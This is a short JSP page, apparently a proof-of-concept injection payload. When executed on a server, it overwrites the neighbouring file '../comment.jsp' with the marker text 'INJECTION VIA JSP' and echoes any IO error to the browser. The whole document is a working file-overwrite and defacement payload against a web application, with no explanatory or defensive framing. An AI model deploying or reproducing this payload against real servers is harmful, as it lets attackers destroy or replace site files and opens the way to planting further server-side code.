<%@ page import="java.io.*"  %>
<%
	String commentPage = "../comment.jsp";
	try
	{
		PrintWriter p = new PrintWriter( new FileOutputStream(commentPage));
		p.println("INJECTION VIA JSP");
		p.close();
	}
	catch(IOException e)
	{
		out.println(e.getMessage());
	}
%>